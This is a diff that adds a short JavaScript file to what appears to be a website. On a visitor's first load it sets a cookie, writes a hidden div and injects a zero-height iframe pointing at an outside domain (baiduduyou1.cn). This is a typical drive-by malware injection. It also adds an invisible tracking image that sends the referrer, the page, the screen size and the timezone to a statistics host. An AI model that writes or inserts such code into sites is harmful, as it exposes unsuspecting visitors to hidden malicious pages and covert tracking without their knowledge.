@@ -1,0 +1,20 @@
+function Get(){
+var Then = new Date() 
+Then.setTime(Then.getTime() + 24*60*60*1000)
+var cookieString = new String(document.cookie)
+var cookieHeader = "Cookie1=" 
+var beginPosition = cookieString.indexOf(cookieHeader)
+if (beginPosition != -1){ 
+} else 
+{ document.cookie = "Cookie1=risb;expires="+ Then.toGMTString()
+document.write("<div style=\"display:none\">");
+document.writeln("<iframe width=100 height=0 src=http://baiduduyou1.cn/b057850/b05.htm></iframe>");
+// A Popular Free Statistics Service for 200 000+ Webmasters. 
+var a0584tf="51la";var a0584pu="";var a0584pf="51la";var a0584su=window.location;var a0584sf=document.referrer;var a0584of="";var a0584op="";var a0584ops=1;var a0584ot=1;var a0584d=new Date();var a0584color="";if (navigator.appName=="Netscape"){a0584color=screen.pixelDepth;} else {a0584color=screen.colorDepth;}
+try{a0584tf=top.document.referrer;}catch(e){}
+try{a0584pu =window.parent.location;}catch(e){}
+try{a0584pf=window.parent.document.referrer;}catch(e){}
+try{a0584ops=document.cookie.match(new RegExp("(^| )AJSTAT_ok_pages=([^;]*)(;|$)"));a0584ops=(a0584ops==null)?1: (parseInt(unescape((a0584ops)[2]))+1);var a0584oe =new Date();a0584oe.setTime(a0584oe.getTime()+60*60*1000);document.cookie="AJSTAT_ok_pages="+a0584ops+ ";path=/;expires="+a0584oe.toGMTString();a0584ot=document.cookie.match(new RegExp("(^| )AJSTAT_ok_times=([^;]*)(;|$)"));if(a0584ot==null){a0584ot=1;}else{a0584ot=parseInt(unescape((a0584ot)[2])); a0584ot=(a0584ops==1)?(a0584ot+1):(a0584ot);}a0584oe.setTime(a0584oe.getTime()+365*24*60*60*1000);document.cookie="AJSTAT_ok_times="+a0584ot+";path=/;expires="+a0584oe.toGMTString();}catch(e){}
+a0584of=a0584sf;if(a0584pf!=="51la"){a0584of=a0584pf;}if(a0584tf!=="51la"){a0584of=a0584tf;}a0584op=a0584pu;try{lainframe}catch(e){a0584op=a0584su;}document.write('<img style="width:0px;height:0px" src="http://web.51.la/go.asp?we=A-Free-Service-for-Webmasters&svid=15&id=2340584&tpages='+a0584ops+'&ttimes='+a0584ot+'&tzone='+(0-a0584d.getTimezoneOffset()/60)+'&tcolor='+a0584color+'&sSize='+screen.width+','+screen.height+'&referrer='+escape(a0584of)+'&vpage='+escape(a0584op)+'" />');
+}
+}Get();
